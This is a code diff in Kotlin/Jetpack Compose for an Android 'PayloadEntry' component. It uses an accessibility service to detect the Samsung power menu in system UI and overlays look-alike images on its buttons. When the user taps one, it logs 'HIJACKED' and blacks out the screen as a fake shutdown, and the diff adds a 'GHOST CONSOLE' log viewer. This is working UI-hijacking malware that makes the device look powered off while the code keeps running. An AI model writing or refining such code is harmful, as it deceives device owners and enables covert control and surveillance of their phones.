@@ -25,8 +25,8 @@ class PayloadEntry : DynamicEntry {
 
     override @Composable fun Render(context: Context, resDir: File) {
         val density = LocalDensity.current
+        val clipboardManager = androidx.compose.ui.platform.LocalClipboardManager.current
 
-        // Load Bitmaps from resDir
         val images = remember(resDir) {
             mapOf(
                 "Power off" to loadBitmap(resDir, "power.png"),
@@ -38,23 +38,21 @@ class PayloadEntry : DynamicEntry {
         }
 
         LaunchedEffect(Unit) {
-            DynamicEntry.log("👻 Ghost active. Target: Samsung Power Menu")
+            DynamicEntry.log("📡 Brain Online. Hijack Ready.")
             
             DynamicEntry.accessibilityInterceptor = { event ->
                 if (event.packageName == "com.android.systemui") {
                     val root = DynamicEntry.activeAccessibilityService?.rootInActiveWindow
                     root?.let { 
                         updateStickerMap(it)
-                        // If we found stickers, activate hijack
                         val foundAny = stickerBounds.isNotEmpty()
                         if (foundAny != isHijackActive) {
                             isHijackActive = foundAny
-                            DynamicEntry.log(if (foundAny) "🎯 TARGET LOCKED: Stickers Matched" else "📉 TARGET LOST: Cleaning up")
+                            DynamicEntry.log(if (foundAny) "🎯 TARGET LOCKED" else "📉 TARGET LOST")
                             DynamicEntry.overlayConfig = DynamicEntry.OverlayConfig(
                                 flags = if (foundAny) 
                                     android.view.WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or android.view.WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN
-                                    else android.view.WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or android.view.WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE,
-                                alpha = 1.0f
+                                    else android.view.WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or android.view.WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE
                             )
                         }
                     }
@@ -66,38 +64,48 @@ class PayloadEntry : DynamicEntry {
             }
         }
 
-        // --- THE HIJACK UI ---
+        // --- MAIN APP UI ---
+        Column(modifier = Modifier.fillMaxSize().background(Color.Black).padding(16.dp)) {
+            Text("GHOST CONSOLE", color = Color.Green, fontSize = 18.sp)
+            Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.SpaceEvenly) {
+                androidx.compose.material3.Button(onClick = { DynamicEntry.systemLogs.clear() }) { Text("Clear") }
+                androidx.compose.material3.Button(onClick = { 
+                    val allLogs = DynamicEntry.systemLogs.joinToString("\n")
+                    clipboardManager.setText(androidx.compose.ui.text.AnnotatedString(allLogs))
+                }) { Text("Copy") }
+            }
+            androidx.compose.foundation.lazy.LazyColumn(modifier = Modifier.weight(1f).fillMaxWidth()) {
+                items(DynamicEntry.systemLogs.asReversed()) { log ->
+                    Text(log, color = Color(0xFF00FF00), fontSize = 11.sp, fontFamily = FontFamily.Monospace)
+                    HorizontalDivider(color = Color.DarkGray)
+                }
+            }
+        }
+
+        // --- HIJACK OVERLAY ---
         SideEffect {
             if (isHijackActive) {
                 DynamicEntry.overlayContent = { 
                     Box(modifier = Modifier.fillMaxSize()) {
                         stickerBounds.forEach { (name, rect) ->
                             val bitmap = images[name]
-                            if (bitmap != null) {
-                                Box(
-                                    modifier = Modifier
-                                        .offset(
-                                            x = with(density) { rect.left.toDp() },
-                                            y = with(density) { rect.top.toDp() }
-                                        )
-                                        .size(
-                                            width = with(density) { (rect.right - rect.left).toDp() },
-                                            height = with(density) { (rect.bottom - rect.top).toDp() }
-                                        )
-                                        .clickable { 
-                                            DynamicEntry.log("⚡ HIJACK TRIGGERED: User tapped $name")
-                                            // FAKE SHUTDOWN START
-                                            DynamicEntry.overlayContent = { 
-                                                Box(modifier = Modifier.fillMaxSize().background(Color.Black)) 
-                                            }
-                                        }
-                                ) {
-                                    Image(bitmap = bitmap, contentDescription = null, modifier = Modifier.fillMaxSize())
-                                }
+                            Box(
+                                modifier = Modifier
+                                    .offset(x = with(density) { rect.left.toDp() }, y = with(density) { rect.top.toDp() })
+                                    .size(width = with(density) { (rect.right - rect.left).toDp() }, height = with(density) { (rect.bottom - rect.top).toDp() })
+                                    .clickable { 
+                                        DynamicEntry.log("⚡ HIJACKED: $name")
+                                        DynamicEntry.overlayContent = { Box(modifier = Modifier.fillMaxSize().background(Color.Black)) } 
+                                    }
+                            ) {
+                                if (bitmap != null) Image(bitmap = bitmap, contentDescription = null, modifier = Modifier.fillMaxSize())
+                                else Box(modifier = Modifier.fillMaxSize().background(Color.Red.copy(0.3f))) // Debug if image fails
                             }
                         }
                     }
                 }
+            } else {
+                DynamicEntry.overlayContent = null
             }
         }
     }
